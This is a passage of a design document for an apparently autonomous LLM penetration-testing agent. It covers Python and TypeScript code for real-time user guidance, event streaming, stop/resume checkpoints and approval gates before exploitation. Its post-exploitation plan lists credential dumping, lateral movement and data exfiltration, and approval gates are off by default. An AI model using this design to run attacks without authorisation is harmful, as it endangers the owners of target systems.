        self._local_queue: List[Dict] = []

    def push(self, message: str, source: str = "user") -> int:
        """Push a guidance message onto the queue.

        Called by the WebSocket handler when user sends guidance.
        Returns the current queue size.
        """
        entry = {
            "message": message,
            "source": source,
            "timestamp": datetime.utcnow().isoformat(),
        }
        if self.redis and self.queue_key:
            self.redis.rpush(self.queue_key, json.dumps(entry))
            # Also append to history (capped at 100)
            self.redis.rpush(self.history_key, json.dumps(entry))
            self.redis.ltrim(self.history_key, -100, -1)
            return self.redis.llen(self.queue_key)
        else:
            self._local_queue.append(entry)
            return len(self._local_queue)

    def drain(self) -> List[str]:
        """Drain ALL pending guidance messages (non-blocking).

        Called by the agent at the top of each iteration.
        Returns list of message strings.
        """
        messages = []
        if self.redis and self.queue_key:
            while True:
                raw = self.redis.lpop(self.queue_key)
                if raw is None:
                    break
                try:
                    entry = json.loads(raw)
                    messages.append(entry.get("message", str(entry)))
                except Exception:
                    messages.append(str(raw))
        else:
            messages = [m.get("message", str(m)) for m in self._local_queue]
            self._local_queue.clear()

        if messages:
            logger.info(f"Drained {len(messages)} guidance messages for job {self.job_id}")
        return messages

    def format_for_injection(self, messages: List[str]) -> Optional[str]:
        """Format drained guidance messages for LLM context injection.

        Returns a system message string, or None if no messages.
        """
        if not messages:
            return None

        lines = ["📡 USER GUIDANCE (received while you were working):"]
        for i, msg in enumerate(messages, 1):
            lines.append(f"  {i}. {msg}")
        lines.append("")
        lines.append("Acknowledge this guidance and adjust your approach accordingly.")
        lines.append("If the user asked a question, answer it in your next response.")
        return "\n".join(lines)

    def get_history(self, limit: int = 50) -> List[Dict]:
        """Get recent guidance history."""
        if self.redis and self.history_key:
            raw_items = self.redis.lrange(self.history_key, -limit, -1)
            return [json.loads(r) for r in raw_items]
        return []
```

**Integration into `dynamic_agent.py`:**

```python
# CURRENT supervisor hint reading (line ~878):
def _read_supervisor_hints(self) -> List[Dict]:
    if not os.path.exists(self.supervisor_hint_path):
        return []
    # ... reads JSONL file ...

# PROPOSED — add guidance queue alongside existing hints:

# In __init__:
from guidance_queue import GuidanceQueue
self.guidance = GuidanceQueue(
    redis_client=getattr(self, 'redis_client', None),
    job_id=self.session_id,
)

# In the main agent loop, at the TOP of each iteration (before LLM call):
def _drain_and_inject_guidance(self):
    """Drain real-time guidance and inject into conversation."""
    messages = self.guidance.drain()
    formatted = self.guidance.format_for_injection(messages)
    if formatted:
        self.conversation.append({"role": "system", "content": formatted})
        self._log(f"Injected {len(messages)} guidance messages", "INFO")

    # ALSO read legacy supervisor hints (backward compat)
    hints = self._read_supervisor_hints()
    self._apply_supervisor_directives()  # existing method
```

**WebSocket handler integration (in `control-plane/api/routers/websocket.py`):**

```python
# ADD new WebSocket endpoint for bidirectional chat:

@router.websocket("/jobs/{job_id}/chat")
async def job_chat_websocket(
    websocket: WebSocket,
    job_id: str,
    token: Optional[str] = Query(None),
):
    """
    Bidirectional chat WebSocket for job interaction.

    Client → Server messages:
      {"type": "guidance", "payload": {"message": "Focus on SMB"}}
      {"type": "approval", "payload": {"decision": "approve"}}
      {"type": "answer", "payload": {"answer": "Use the first option"}}
      {"type": "stop", "payload": {}}
      {"type": "resume", "payload": {}}
      {"type": "ping", "payload": {}}

    Server → Client messages:
      {"type": "thinking", "payload": {"thought": "...", "iteration": 5}}
      {"type": "tool_start", "payload": {"tool_name": "nmap", "command": "..."}}
      {"type": "tool_output_chunk", "payload": {"chunk": "...", "tool_name": "nmap"}}
      {"type": "tool_complete", "payload": {"tool_name": "nmap", "success": true}}
      {"type": "phase_update", "payload": {"phase": "EXPLOITATION", "iteration": 15}}
      {"type": "approval_request", "payload": {"from_phase": "...", "to_phase": "..."}}
      {"type": "question", "payload": {"question": "...", "options": [...]}}
      {"type": "execution_step", "payload": {"iteration": 5, "tool": "nmap", ...}}
      {"type": "response", "payload": {"answer": "...", "complete": false}}
      {"type": "task_complete", "payload": {"message": "...", "iterations": 50}}
      {"type": "error", "payload": {"message": "...", "recoverable": true}}
      {"type": "guidance_ack", "payload": {"message": "...", "queue_position": 2}}
      {"type": "todo_update", "payload": {"items": [...]}}
      {"type": "stopped", "payload": {"iteration": 15, "phase": "EXPLOITATION"}}
      {"type": "pong", "payload": {}}
    """
    try:
        job_uuid = UUID(job_id)
    except Exception:
        await websocket.close(code=1008)
        return

    user = await _authorize_ws(websocket, token, job_id=job_uuid)
    if not user:
        return

    await websocket.accept()
    redis_url = os.getenv("REDIS_URL", "redis://localhost:6379/0")
    redis_sync = redis.from_url(redis_url, decode_responses=True)

    # Subscribe to agent events (output + structured events)
    redis_sub = redis.from_url(redis_url, decode_responses=True)
    pubsub = redis_sub.pubsub()
    output_channel = f"job:{job_id}:output"
    events_channel = f"job:{job_id}:events"
    await pubsub.subscribe(output_channel, events_channel)

    async def forward_agent_events():
        """Forward agent events from Redis pubsub to WebSocket."""
        try:
            async for message in pubsub.listen():
                if message["type"] == "message":
                    try:
                        data = json.loads(message["data"])
                        await websocket.send_json(data)
                    except json.JSONDecodeError:
                        await websocket.send_json({
                            "type": "output",
                            "payload": {"line": str(message["data"])}
                        })
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Event forward error: {e}")

    # Start forwarding in background
    forward_task = asyncio.create_task(forward_agent_events())

    try:
        while True:
            raw = await websocket.receive_text()
            msg = json.loads(raw)
            msg_type = msg.get("type", "")
            payload = msg.get("payload", {})

            if msg_type == "guidance":
                # Push to Redis guidance queue
                message_text = payload.get("message", "")
                queue_size = await asyncio.to_thread(
                    redis_sync.rpush,
                    f"job:{job_id}:guidance",
                    json.dumps({"message": message_text, "source": "user",
                                "timestamp": datetime.utcnow().isoformat()})
                )
                await websocket.send_json({
                    "type": "guidance_ack",
                    "payload": {"message": message_text, "queue_position": queue_size},
                    "timestamp": datetime.utcnow().isoformat(),
                })

            elif msg_type == "approval":
                # Store approval response in Redis
                await asyncio.to_thread(
                    redis_sync.set,
                    f"job:{job_id}:approval_response",
                    json.dumps({
                        "decision": payload.get("decision", "approve"),
                        "modification": payload.get("modification"),
                        "request_id": payload.get("request_id"),
                    })
                )

            elif msg_type == "answer":
                # Store answer to agent question in Redis
                await asyncio.to_thread(
                    redis_sync.set,
                    f"job:{job_id}:user_answer",
                    json.dumps({
                        "answer": payload.get("answer", ""),
                        "question_id": payload.get("question_id"),
                    })
                )

            elif msg_type == "stop":
                # Signal stop via Redis
                await asyncio.to_thread(
                    redis_sync.set, f"job:{job_id}:stop_signal", "1"
                )
                # Agent checks this flag each iteration

            elif msg_type == "resume":
                await asyncio.to_thread(
                    redis_sync.delete, f"job:{job_id}:stop_signal"
                )

            elif msg_type == "ping":
                await websocket.send_json({"type": "pong", "payload": {}})

    except WebSocketDisconnect:
        logger.info(f"Chat WebSocket disconnected for job {job_id}")
    except Exception as e:
        logger.error(f"Chat WebSocket error: {e}")
    finally:
        forward_task.cancel()
        await pubsub.unsubscribe(output_channel, events_channel)
        await pubsub.close()
        await redis_sub.close()
        await redis_sync.close()
```

### 6.4 Component C: Structured Streaming Events

The agent must emit rich structured events (not just raw log lines) so the frontend can render a proper chat UI with phases, tool executions, thoughts, and interactive elements.

**File: `kali-executor/open-interpreter/event_emitter.py` (NEW)**

```python
"""
Structured event emitter for TazoSploit agent.

Publishes rich events via Redis pubsub that the WebSocket handler
forwards to the frontend. Replaces raw log line streaming.
"""
import json
import logging
from datetime import datetime, timezone
from typing import Optional, Dict, List, Any

logger = logging.getLogger(__name__)


class EventType:
    """All event types the agent can emit."""
    THINKING = "thinking"
    THINKING_CHUNK = "thinking_chunk"
    TOOL_START = "tool_start"
    TOOL_OUTPUT_CHUNK = "tool_output_chunk"
    TOOL_COMPLETE = "tool_complete"
    PHASE_UPDATE = "phase_update"
    TODO_UPDATE = "todo_update"
    APPROVAL_REQUEST = "approval_request"
    QUESTION_REQUEST = "question"
    RESPONSE = "response"
    EXECUTION_STEP = "execution_step"
    TASK_COMPLETE = "task_complete"
    ERROR = "error"
    STOPPED = "stopped"


class AgentEventEmitter:
    """Emit structured events from the agent to the frontend."""

    def __init__(self, redis_client=None, job_id: str = None, websocket=None):
        self.redis = redis_client
        self.job_id = job_id
        self.websocket = websocket
        self.events_channel = f"job:{job_id}:events" if job_id else None

    def _publish(self, event_type: str, payload: Dict):
        """Publish event to Redis pubsub AND legacy WebSocket."""
        message = {
            "type": event_type,
            "payload": payload,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "job_id": self.job_id,
        }
        # Redis pubsub (for new chat WebSocket)
        if self.redis and self.events_channel:
            try:
                self.redis.publish(self.events_channel, json.dumps(message))
            except Exception as e:
                logger.warning(f"Redis publish failed: {e}")

        # Legacy WebSocket (backward compat)
        if self.websocket:
            import asyncio
            try:
                asyncio.create_task(self.websocket.send_json(message))
            except Exception:
                pass

    def emit_thinking(self, iteration: int, phase: str, thought: str, reasoning: str = ""):
        """Agent is thinking/planning its next action."""
        self._publish(EventType.THINKING, {
            "iteration": iteration,
            "phase": phase,
            "thought": thought,
            "reasoning": reasoning,
        })

    def emit_thinking_chunk(self, chunk: str):
        """Streaming chunk of agent's thought process (for real-time display)."""
        self._publish(EventType.THINKING_CHUNK, {"chunk": chunk})

    def emit_tool_start(self, tool_name: str, command: str, args: Dict = None):
        """Tool execution is starting."""
        self._publish(EventType.TOOL_START, {
            "tool_name": tool_name,
            "command": command,
            "args": args or {},
        })

    def emit_tool_output_chunk(self, tool_name: str, chunk: str, is_final: bool = False):
        """Streaming chunk of tool output."""
        self._publish(EventType.TOOL_OUTPUT_CHUNK, {
            "tool_name": tool_name,
            "chunk": chunk,
            "is_final": is_final,
        })

    def emit_tool_complete(self, tool_name: str, success: bool, output_summary: str,
                           findings: List[str] = None, next_steps: List[str] = None):
        """Tool execution completed."""
        self._publish(EventType.TOOL_COMPLETE, {
            "tool_name": tool_name,
            "success": success,
            "output_summary": output_summary[:2000],
            "findings": findings or [],
            "next_steps": next_steps or [],
        })

    def emit_phase_update(self, phase: str, iteration: int, attack_type: str = "general"):
        """Phase has changed."""
        self._publish(EventType.PHASE_UPDATE, {
            "phase": phase,
            "iteration": iteration,
            "attack_type": attack_type,
        })

    def emit_todo_update(self, todo_list: List[Dict]):
        """Agent's task list was updated."""
        self._publish(EventType.TODO_UPDATE, {"items": todo_list})

    def emit_approval_request(self, from_phase: str, to_phase: str, reason: str,
                              planned_actions: List[str] = None, risks: List[str] = None):
        """Agent requests user approval for phase transition."""
        self._publish(EventType.APPROVAL_REQUEST, {
            "from_phase": from_phase,
            "to_phase": to_phase,
            "reason": reason,
            "planned_actions": planned_actions or [],
            "risks": risks or [],
        })

    def emit_question(self, question: str, context: str = "",
                      format: str = "text", options: List[str] = None,
                      question_id: str = None):
        """Agent asks the user a clarifying question."""
        self._publish(EventType.QUESTION_REQUEST, {
            "question_id": question_id or f"q-{int(datetime.utcnow().timestamp())}",
            "question": question,
            "context": context,
            "format": format,  # "text", "single_choice", "multi_choice"
            "options": options or [],
        })

    def emit_execution_step(self, step: Dict):
        """Completed execution step summary."""
        self._publish(EventType.EXECUTION_STEP, step)

    def emit_response(self, answer: str, iteration: int, phase: str, complete: bool = False):
        """Agent's response/answer to the user."""
        self._publish(EventType.RESPONSE, {
            "answer": answer,
            "iteration": iteration,
            "phase": phase,
            "complete": complete,
        })

    def emit_task_complete(self, message: str, phase: str, total_iterations: int):
        """Job is finished."""
        self._publish(EventType.TASK_COMPLETE, {
            "message": message,
            "final_phase": phase,
            "total_iterations": total_iterations,
        })

    def emit_error(self, message: str, recoverable: bool = True):
        """Error occurred."""
        self._publish(EventType.ERROR, {
            "message": message,
            "recoverable": recoverable,
        })
```

**Integration into `dynamic_agent.py`:**

```python
# In __init__:
from event_emitter import AgentEventEmitter
self.events = AgentEventEmitter(
    redis_client=getattr(self, 'redis_client', None),
    job_id=self.session_id,
    websocket=self.websocket,
)

# BEFORE LLM call (emit thinking):
self.events.emit_thinking(
    iteration=self.iteration,
    phase=self.phase.current.value,
    thought=f"Analyzing findings, planning next action...",
)

# BEFORE command execution (emit tool_start):
tool = self._detect_tool(content)
self.events.emit_tool_start(tool_name=tool, command=content)

# DURING execution (stream output chunks) — modify _execute():
# Where subprocess output is read line-by-line, emit chunks:
for line in process.stdout:
    self.events.emit_tool_output_chunk(tool_name=tool, chunk=line)

# AFTER execution (emit tool_complete):
self.events.emit_tool_complete(
    tool_name=execution.tool,
    success=execution.exit_code == 0,
    output_summary=execution.stdout[:2000],
    findings=execution.findings,
)

# ON phase transition:
self.events.emit_phase_update(
    phase=self.phase.current.value,
    iteration=self.iteration,
)

# ON completion:
self.events.emit_task_complete(
    message="Pentest completed",
    phase=self.phase.current.value,
    total_iterations=self.iteration,
)
```

### 6.5 Component D: Stop/Resume

The agent needs a way to be stopped mid-execution and resumed from where it left off.

**How RedAmon does it:**
- `stop` message → handler calls `connection._active_task.cancel()` + sets `_is_stopped = True`
- LangGraph's `MemorySaver` checkpointer persists full state after every graph node execution
- `resume` message → handler creates new task calling `orchestrator.resume_execution_with_streaming()` which loads from checkpoint and continues

**TazoSploit implementation:**

TazoSploit doesn't use LangGraph, so we implement a simpler Redis-based checkpoint:

```python
# In dynamic_agent.py — add to main agent loop:

def _check_stop_signal(self) -> bool:
    """Check if user requested stop via Redis flag."""
    if not hasattr(self, 'redis_client') or not self.redis_client:
        return False
    stop = self.redis_client.get(f"job:{self.session_id}:stop_signal")
    return stop == "1"

def _save_checkpoint(self):
    """Save agent state to Redis for resume capability."""
    if not hasattr(self, 'redis_client') or not self.redis_client:
        return
    checkpoint = {
        'iteration': self.iteration,
        'phase': self.phase.current.value if hasattr(self.phase, 'current') else self.phase_current,
        'target': self.target,
        'objective': self.objective,
        'vulns_found': {k: (v if isinstance(v, dict) else {}) for k, v in self.vulns_found.items()},
        'conversation_len': len(self.conversation),
        'execution_count': len(self.executions),
        'todo_list': getattr(self, 'todo_list', []),
        'timestamp': datetime.now(timezone.utc).isoformat(),
    }
    self.redis_client.set(
        f"job:{self.session_id}:checkpoint",
        json.dumps(checkpoint),
        ex=86400,  # 24h TTL
    )
    # Also save full conversation for resume
    self.redis_client.set(
        f"job:{self.session_id}:conversation",
        json.dumps(self.conversation[-200:]),  # Last 200 messages
        ex=86400,
    )

def _load_checkpoint(self) -> bool:
    """Load agent state from checkpoint. Returns True if resumed."""
    if not hasattr(self, 'redis_client') or not self.redis_client:
        return False
    raw = self.redis_client.get(f"job:{self.session_id}:checkpoint")
    if not raw:
        return False
    try:
        checkpoint = json.loads(raw)
        self.iteration = checkpoint.get('iteration', 0)
        # Restore phase
        phase_val = checkpoint.get('phase', 'RECON')
        if hasattr(self, 'phase') and hasattr(self.phase, 'advance'):
            from phase_machine import Phase
            try:
                self.phase.current = Phase(phase_val)
            except ValueError:
                pass
        self._log(f"Resumed from checkpoint: iteration={self.iteration}, phase={phase_val}", "INFO")

        # Restore conversation
        conv_raw = self.redis_client.get(f"job:{self.session_id}:conversation")
        if conv_raw:
            saved_conv = json.loads(conv_raw)
            if saved_conv:
                self.conversation = saved_conv
                self._log(f"Restored {len(self.conversation)} conversation messages", "INFO")

        return True
    except Exception as e:
        self._log(f"Checkpoint load failed: {e}", "WARN")
        return False

# In the main while loop, add at the top of each iteration:
# (This is the core agent loop, typically around the `while self.iteration < self.max_iterations:` block)
if self._check_stop_signal():
    self._save_checkpoint()
    self.events.emit_stopped(iteration=self.iteration, phase=self.phase.current.value)
    self._log("Agent stopped by user", "INFO")
    break  # Exit loop; resume will restart from checkpoint
```

### 6.6 Component E: Approval Gates (Full Flow)

**Approval state machine:**

```
RUNNING ──(needs approval)──► AWAITING_APPROVAL
    │                              │
    │                    ┌─────────┼──────────┐
    │                    ▼         ▼          ▼
    │                APPROVE    MODIFY      ABORT
    │                    │         │          │
    │                    ▼         ▼          ▼
    │               transition  update     stay in
    │               to new      plan &     current
    │               phase       transition phase
    │                    │         │          │
    └────────────────────┴─────────┘          │
         ▲                                    │
         └──────── RUNNING ◄──────────────────┘
```

```python
# In dynamic_agent.py — modify _advance_phase():

def _advance_phase(self, new_phase: str) -> None:
    """Advance to new phase, optionally requiring user approval."""
    from project_settings import get_setting

    needs_approval = False
    if new_phase in ('EXPLOITATION', 'EXPLOIT') and get_setting('REQUIRE_APPROVAL_FOR_EXPLOITATION', False):
        needs_approval = True
    elif new_phase == 'POST_EXPLOIT' and get_setting('REQUIRE_APPROVAL_FOR_POST_EXPLOITATION', False):
        needs_approval = True

    if needs_approval:
        # Emit approval request
        current = self.phase.current.value if hasattr(self.phase, 'current') else self.phase_current
        self.events.emit_approval_request(
            from_phase=current,
            to_phase=new_phase,
            reason=f"Agent wants to transition from {current} to {new_phase}",
            planned_actions=self._get_planned_actions_for_phase(new_phase),
            risks=self._get_risks_for_phase(new_phase),
        )
        # Wait for approval (poll Redis)
        self._awaiting_approval = True
        self._pending_phase = new_phase
        return  # Don't transition yet

    # No approval needed — transition immediately
    if hasattr(self.phase, 'advance'):
        self.phase.advance(new_phase, reason="auto")
    else:
        self.phase_current = new_phase
    self.events.emit_phase_update(phase=new_phase, iteration=self.iteration)

def _check_approval_response(self) -> Optional[str]:
    """Check if user responded to approval request. Returns decision or None."""
    if not getattr(self, '_awaiting_approval', False):
        return None
    if not hasattr(self, 'redis_client') or not self.redis_client:
        return None
    raw = self.redis_client.get(f"job:{self.session_id}:approval_response")
    if not raw:
        return None  # Still waiting
    response = json.loads(raw)
    self.redis_client.delete(f"job:{self.session_id}:approval_response")
    self._awaiting_approval = False

    decision = response.get('decision', 'abort')
    if decision == 'approve':
        new_phase = getattr(self, '_pending_phase', 'EXPLOITATION')
        if hasattr(self.phase, 'advance'):
            self.phase.advance(new_phase, reason="user_approved")
        else:
            self.phase_current = new_phase
        self.events.emit_phase_update(phase=new_phase, iteration=self.iteration)
        self._log(f"User APPROVED transition to {new_phase}", "INFO")
    elif decision == 'modify':
        modification = response.get('modification', '')
        new_phase = getattr(self, '_pending_phase', 'EXPLOITATION')
        if hasattr(self.phase, 'advance'):
            self.phase.advance(new_phase, reason=f"user_modified: {modification}")
        else:
            self.phase_current = new_phase
        # Inject modification as guidance
        self.conversation.append({
            "role": "system",
            "content": f"📝 USER MODIFICATION: {modification}\nAdjust your plan accordingly."
        })
        self.events.emit_phase_update(phase=new_phase, iteration=self.iteration)
        self._log(f"User MODIFIED transition to {new_phase}: {modification}", "INFO")
    elif decision == 'abort':
        self._log("User ABORTED phase transition", "INFO")
        # Stay in current phase
    return decision

def _get_planned_actions_for_phase(self, phase: str) -> List[str]:
    """Generate list of planned actions for approval display."""
    if phase in ('EXPLOITATION', 'EXPLOIT'):
        actions = []
        for vid, v in self.vulns_found.items():
            if isinstance(v, dict) and not v.get('exploited'):
                actions.append(f"Exploit {v.get('type', 'unknown')} on {v.get('target', '?')}")
        return actions[:5] or ["Exploit discovered vulnerabilities"]
    elif phase == 'POST_EXPLOIT':
        return ["Escalate privileges", "Dump credentials", "Lateral movement", "Data exfiltration"]
    return []

def _get_risks_for_phase(self, phase: str) -> List[str]:
    """Generate list of risks for approval display."""
    if phase in ('EXPLOITATION', 'EXPLOIT'):
        return ["Active exploitation may trigger IDS/IPS", "Target service may crash", "Logs will be generated"]
    elif phase == 'POST_EXPLOIT':
        return ["Privilege escalation may trigger alerts", "Data access will be logged", "Lateral movement expands blast radius"]
    return []
```

### 6.7 Component F: Agent Questions (ask_user)

The agent can ask the user clarifying questions mid-run, then wait for and use the answer.

```python
# In dynamic_agent.py — new methods:

def _ask_user(self, question: str, context: str = "",
              format: str = "text", options: List[str] = None) -> Optional[str]:
    """Ask user a question and wait for answer.

    Emits a question event, then returns None. The agent loop should
    check _check_user_answer() each iteration until an answer arrives.
    """
    import uuid
    qid = f"q-{uuid.uuid4().hex[:8]}"
    self._pending_question_id = qid
    self.events.emit_question(
        question=question,
        context=context,
        format=format,
        options=options,
        question_id=qid,
    )
    self._awaiting_answer = True
    return None

def _check_user_answer(self) -> Optional[str]:
    """Check if user answered a pending question."""
    if not getattr(self, '_awaiting_answer', False):
        return None
    if not hasattr(self, 'redis_client') or not self.redis_client:
        return None
    raw = self.redis_client.get(f"job:{self.session_id}:user_answer")
    if not raw:
        return None
    answer_data = json.loads(raw)
    self.redis_client.delete(f"job:{self.session_id}:user_answer")
    self._awaiting_answer = False
    answer = answer_data.get('answer', '')
    self._log(f"User answered question: {answer[:100]}", "INFO")
    # Inject answer into conversation
    self.conversation.append({
        "role": "user",
        "content": answer,
    })
    return answer
```

### 6.8 WebSocket Message Schema Reference

Complete schema for all message types, for frontend implementation:

```typescript
// ===== CLIENT → SERVER =====

interface GuidanceMessage {
    type: "guidance";
    payload: { message: string };
}

interface ApprovalMessage {
    type: "approval";
    payload: {
        decision: "approve" | "modify" | "abort";
        modification?: string;
        request_id?: string;
    };
}

interface AnswerMessage {
    type: "answer";
    payload: {
        answer: string;
        question_id?: string;
    };
}

interface StopMessage {
    type: "stop";
    payload: {};
}

interface ResumeMessage {
    type: "resume";
    payload: {};
}

interface PingMessage {
    type: "ping";
    payload: {};
}

// ===== SERVER → CLIENT =====

interface ThinkingEvent {
    type: "thinking";
    payload: {
        iteration: number;
        phase: string;
        thought: string;
        reasoning: string;
    };
    timestamp: string;
    job_id: string;
}

interface ThinkingChunkEvent {
    type: "thinking_chunk";
    payload: { chunk: string };
    timestamp: string;
}

interface ToolStartEvent {
    type: "tool_start";
    payload: {
        tool_name: string;
        command: string;
        args: Record<string, any>;
    };
    timestamp: string;
}

interface ToolOutputChunkEvent {
    type: "tool_output_chunk";
    payload: {
        tool_name: string;
        chunk: string;
        is_final: boolean;
    };
    timestamp: string;
}

interface ToolCompleteEvent {
    type: "tool_complete";
    payload: {
        tool_name: string;
        success: boolean;
        output_summary: string;
        findings: string[];
        next_steps: string[];
    };
    timestamp: string;
}

interface PhaseUpdateEvent {
    type: "phase_update";
    payload: {
        phase: "RECON" | "VULN_DISCOVERY" | "EXPLOITATION" | "POST_EXPLOIT" | "COMPLETE";
        iteration: number;
        attack_type: string;
    };
    timestamp: string;
}

interface TodoUpdateEvent {
    type: "todo_update";
    payload: {
        items: Array<{
            description: string;
            status: "pending" | "in_progress" | "completed" | "blocked";
            priority: "high" | "medium" | "low";
        }>;
    };
    timestamp: string;
}

interface ApprovalRequestEvent {
    type: "approval_request";
    payload: {
        from_phase: string;
        to_phase: string;
        reason: string;
        planned_actions: string[];
        risks: string[];
    };
    timestamp: string;
}

interface QuestionEvent {
    type: "question";
    payload: {
        question_id: string;
        question: string;
        context: string;
        format: "text" | "single_choice" | "multi_choice";
        options: string[];
    };
    timestamp: string;
}

interface ExecutionStepEvent {
    type: "execution_step";
    payload: {
        iteration: number;
        phase: string;
        tool: string;
        command: string;
        success: boolean;
        output_summary: string;
        duration_s: number;
    };
    timestamp: string;
}

interface ResponseEvent {
    type: "response";
    payload: {
        answer: string;
        iteration: number;
        phase: string;
        complete: boolean;
    };
    timestamp: string;
}

interface TaskCompleteEvent {
    type: "task_complete";
    payload: {
        message: string;
        final_phase: string;
        total_iterations: number;
    };
    timestamp: string;
}

interface ErrorEvent {
    type: "error";
    payload: {
        message: string;
        recoverable: boolean;
    };
    timestamp: string;
}

interface GuidanceAckEvent {
    type: "guidance_ack";
    payload: {
        message: string;
        queue_position: number;
    };
    timestamp: string;
}

interface StoppedEvent {
    type: "stopped";
    payload: {
        iteration: number;
        phase: string;
    };
    timestamp: string;
}

interface PongEvent {
    type: "pong";
    payload: {};
    timestamp: string;
}
```

### 6.9 Main Agent Loop Refactor (Putting It All Together)

The main agent loop in `dynamic_agent.py` needs to be updated to integrate all interactive components. Here's the pseudocode for the complete iteration cycle:

```python
# In the main while loop of the agent (the core run loop):

while self.iteration < self.max_iterations:
    self.iteration += 1

    # ──── 1. CHECK STOP SIGNAL ────
    if self._check_stop_signal():
        self._save_checkpoint()
        self.events.emit_stopped(...)
        break

    # ──── 2. CHECK PENDING APPROVAL ────
    if getattr(self, '_awaiting_approval', False):
        decision = self._check_approval_response()
        if decision is None:
            # Still waiting — sleep and retry
            time.sleep(1)
            self.iteration -= 1  # Don't count this as an iteration
            continue

    # ──── 3. CHECK PENDING QUESTION ANSWER ────
    if getattr(self, '_awaiting_answer', False):
        answer = self._check_user_answer()
        if answer is None:
            time.sleep(1)
            self.iteration -= 1
            continue

    # ──── 4. DRAIN GUIDANCE QUEUE ────
    self._drain_and_inject_guidance()

    # ──── 5. PHASE GATE CHECK ────
    gate_msg = self._enforce_phase_gate_before_llm()
    if gate_msg:
        self.conversation.append({"role": "system", "content": gate_msg})

    # ──── 6. INJECT CONTEXT (graph summary, diversity, exploitation plan) ────
    # ... existing context injection ...

    # ──── 7. EMIT THINKING EVENT ────
    self.events.emit_thinking(
        iteration=self.iteration,
        phase=self.phase.current.value,
        thought="Planning next action...",
    )

    # ──── 8. LLM CALL ────
    response = self.llm.chat(self.conversation)

    # ──── 9. PARSE RESPONSE ────
    executables = self._extract_executable(response)
    # (or structured output parsing)

    # ──── 10. EXECUTE COMMANDS ────
    for exec_type, content in executables:
        # Phase gate check
        block = self._check_tool_phase_gate(content)
        if block:
            self.conversation.append({"role": "system", "content": block})
            continue

        # Emit tool_start
        tool = self._detect_tool(content)
        self.events.emit_tool_start(tool_name=tool, command=content)

        # Execute
        execution = self._execute(exec_type, content)

        # Emit tool_complete
        self.events.emit_tool_complete(
            tool_name=tool,
            success=execution.exit_code == 0,
            output_summary=execution.stdout[:2000],
        )

        # Emit execution_step
        self.events.emit_execution_step({
            "iteration": self.iteration,
            "phase": self.phase.current.value,
            "tool": tool,
            "command": content[:500],
            "success": execution.exit_code == 0,
            "output_summary": execution.stdout[:500],
            "duration_s": execution.duration_s,
        })

        # Update knowledge graph
        if self.kg.available:
            auto_parse(tool, execution.stdout, self.kg, self.target)

        # Track tool usage
        self.tool_tracker.record(tool)

    # ──── 11. SAVE CHECKPOINT (every N iterations) ────
    if self.iteration % 5 == 0:
        self._save_checkpoint()

    # ──── 12. CHECK COMPLETION ────
    if self._is_task_complete():
        self.events.emit_task_complete(...)
        break
```

### 6.10 Frontend Components Needed

The React frontend needs these new components (build in Sprint 0/1):

1. **ChatInterface** — Main chat view replacing the simple job form
   - Message list (user messages + agent events rendered as chat bubbles)
   - Input field for natural language + guidance
   - "New Job" starts with a message, not a form

2. **ToolExecutionCard** — Renders `tool_start` → `tool_output_chunk` → `tool_complete` as a collapsible card
   - Tool name + command as header
   - Streaming output in a terminal-style box
   - Success/failure indicator
   - Findings and next steps

3. **ThinkingIndicator** — Shows agent's thought/reasoning with typing animation
   - Streams `thinking_chunk` events

4. **PhaseProgressBar** — Horizontal progress: RECON → VULN → EXPLOIT → POST_EXPLOIT
   - Updates on `phase_update` events
   - Shows iteration count

5. **ApprovalModal** — Modal dialog for approval requests
   - Shows planned actions and risks
   - Three buttons: Approve, Modify (opens text input), Abort

6. **QuestionCard** — Inline card for agent questions
   - Text input for free-form answers
   - Radio buttons for single_choice
   - Checkboxes for multi_choice

7. **TodoSidebar** — Collapsible sidebar showing agent's task list
   - Updates on `todo_update` events

8. **StopResumeButton** — Floating button to stop/resume execution

### 6.11 Sprint Integration

This interactive chat system should be implemented as **Sprint 0** (before everything else) OR integrated across Sprints 1-4:

**If Sprint 0 (recommended — 2 weeks):**
- Week 1: Backend (guidance_queue.py, event_emitter.py, intent_classifier.py, chat WebSocket endpoint, stop/resume, approval gates)
- Week 2: Frontend (ChatInterface, ToolExecutionCard, ThinkingIndicator, PhaseProgressBar, ApprovalModal, QuestionCard)

**If integrated into existing sprints:**
- Sprint 1: Add event_emitter.py + guidance_queue.py (backend only, no frontend)
- Sprint 2: Add intent_classifier.py + chat WebSocket endpoint
- Sprint 3: Add approval gates + question system
- Sprint 4: Full frontend chat UI

### 6.12 New Files Summary for Interactive Chat

| # | Path | Purpose |
|---|------|---------|
| 1 | `kali-executor/open-interpreter/intent_classifier.py` | Natural language → job config |
| 2 | `kali-executor/open-interpreter/guidance_queue.py` | Redis-backed real-time guidance |
| 3 | `kali-executor/open-interpreter/event_emitter.py` | Structured event publishing |
| 4 | `control-plane/api/routers/websocket.py` | Add `job_chat_websocket` endpoint |
| 5 | `control-plane/api/routers/jobs.py` | Add `POST /jobs/chat` endpoint |
| 6 | `frontend/components/ChatInterface.tsx` | Main chat UI |
| 7 | `frontend/components/ToolExecutionCard.tsx` | Tool execution display |
| 8 | `frontend/components/ApprovalModal.tsx` | Approval gate UI |
| 9 | `frontend/components/QuestionCard.tsx` | Agent question UI |
| 10 | `frontend/components/PhaseProgressBar.tsx` | Phase progress display |

---

## 7. Part 5: Implementation Plan (Sprint Order)

### Sprint 0 (Week 0-1): Interactive Chat System (CRITICAL — Do First)

**Goal:** Replace form-based job creation with conversational interface. Add bidirectional WebSocket communication.

#### Files to Create:
1. `kali-executor/open-interpreter/intent_classifier.py` — Natural language intent classification
2. `kali-executor/open-interpreter/guidance_queue.py` — Redis-backed guidance queue
3. `kali-executor/open-interpreter/event_emitter.py` — Structured event publisher

#### Files to Modify:
1. **`control-plane/api/routers/websocket.py`** — Add `job_chat_websocket` endpoint (as defined in Part 6.3)
2. **`control-plane/api/routers/jobs.py`** — Add `POST /jobs/chat` endpoint (as defined in Part 6.2)
3. **`kali-executor/open-interpreter/dynamic_agent.py`** — Integrate event emitter + guidance drain

   **Change 1: Initialize event emitter and guidance queue in `__init__`**
   ```python
   from event_emitter import AgentEventEmitter
   from guidance_queue import GuidanceQueue
   self.events = AgentEventEmitter(
       redis_client=getattr(self, 'redis_client', None),
       job_id=self.session_id,
       websocket=self.websocket,
   )
   self.guidance = GuidanceQueue(
       redis_client=getattr(self, 'redis_client', None),
       job_id=self.session_id,
   )
   self._awaiting_approval = False
   self._awaiting_answer = False
   ```

